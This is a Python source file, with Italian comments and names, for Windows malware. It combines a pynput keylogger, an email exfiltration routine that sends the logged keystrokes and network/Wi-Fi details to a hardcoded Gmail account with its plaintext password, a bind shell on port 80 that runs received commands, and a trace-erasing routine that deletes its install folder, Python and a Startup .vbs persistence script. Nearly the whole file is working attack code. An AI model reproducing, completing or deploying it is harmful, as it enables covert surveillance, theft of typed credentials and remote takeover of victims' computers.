import smtplib
from email.message import EmailMessage
import imghdr
import subprocess
from multiprocessing import Process
import pynput
from pynput.keyboard import Key, Listener
from pathlib import Path
from time import sleep
import socket
import datetime

def ConnectionCheck(p1,p2):
    uscita = subprocess.getoutput("ipconfig && exit").split("\n")

    for riga in uscita:
        if "Indirizzo IPv4" in riga:
            pn = Process(target = Keylogger)
            p2.terminate()
            p1.start()
            sleep(5)
            pn.start()
            break
    else:
        ConnectionCheck(p1,p2)
def Tracer():
    
        msg = EmailMessage()
        msg['Subject'] = "Email Tracement"
        msg['From'] = "tramorio84@gmail.com"
        msg['To'] = "tramorio84@gmail.com"

        uscita = subprocess.getoutput("ipconfig").split("\n")
        rete = subprocess.getoutput("netsh wlan show network").split("\n")[4]
        
        for riga in uscita:
            if "Indirizzo IPv4" in riga:
                allaccio = riga
                break
        else:
            allaccio = ""
            
        msg.set_content("Configurazione di rete...\n/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-\n" + rete + "\n" + allaccio + "\n/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-")
        keyloged = Path.home() / "Desktop" / "configurationsettings.txt"
        file = keyloged.open()
        msg.add_attachment(file.read(),filename = "Keylog.txt")
                    
        with smtplib.SMTP("smtp.gmail.com",587) as smtp:

            smtp.starttls()
                    
            smtp.login("tramorio84@gmail.com","Politto%9")

            smtp.send_message(msg)

            smtp.close()
                
            file.close()

            file = keyloged.open("w")

            file.write("Welcome in the new Exploit made only for you...\n")

            file.close()
            
def Keylogger():
    percorso = Path.home() / "Desktop" / "configurationsettings.txt"

    alfabeto = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZè+òàù,.-é*ç°§;:_[]@#{}1234567890"

    def on_press(key):
        file = percorso.open("a")
        inserimento = "{0}".format(key)
        if inserimento[1] in alfabeto:
            if "Key" not in inserimento:
              file.write(inserimento[1])
            else:
                if inserimento == "Key.space":
                    file.write(" ")
                else:
                    file.write("\n" + inserimento + "\n")
                    
    def on_release(key):
        return True

    with Listener(on_press = on_press, on_release = on_release) as listener:
        listener.join()

#_______________________________________________________________________________________________________________

def cmd(conn):
    conn.send("Remote shell control opened...\n\tDigit 'out' to exit from shell control...".encode())
    while True:
        comando = str(conn.recv(4096))[2:-1]
        if comando != "out":
            esecuzione = subprocess.getoutput(comando)
            if esecuzione == "":
                conn.send("Esecuzione comando avvenuta".encode())
            else:
                conn.send(subprocess.getoutput(comando).encode())
        else:
            conn.send("Uscita dal prompt dei comandi...".encode())
            break

def eliminaProve():
        subprocess.getoutput('cd .. && RMDIR /Q/S configwinx32 && cd "C:%homepath%\\AppData\\Local\\Programs\\" && RMDIR /Q/S Python && cd "C:\\Users\\Mattia Palmucci\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup" && del /A "WinPro84.vbs" && exit')
       
def ServerComandi():
    def ricevi_comandi(conn):
        while True:
            richiesta = str(conn.recv(4096))[2:-1]
            if richiesta == "cmd":
                cmd(conn)
            if richiesta == "eliminaProve":
                conn.send("Elimino i ponti di connessione...".encode())
                eliminaProve()
            else:
                conn.send("Comando errato...")
            # Preparare i comandi CMD -- ELIMINAPROVE -- SCREENSHOT
            
    def sub_server(indirizzo, backlog=1):
        try:
            s = socket.socket()
            s.bind(indirizzo)
            s.listen(backlog)
            print("Server inizializzato e in ascolto...")
        except socket.error as errore:
            sub_server(indirizzo, backlog=1)
        conn, indirizzo_client = s.accept()
        ricevi_comandi(conn)

    sub_server(("",80))

# _______________________________________________________________________________________________________________

if __name__ == "__main__":
##    if datetime.datetime.now().month >= #mese da settare:
##        eliminaProve()    
    p1 = Process(target = Tracer)
    p2 = Process(target = Keylogger)
    p2.start()
    p3 = Process(target = ConnectionCheck(p1,p2))
    p3.start()
    p4 = Process(target = ServerComandi)
    p4.start()
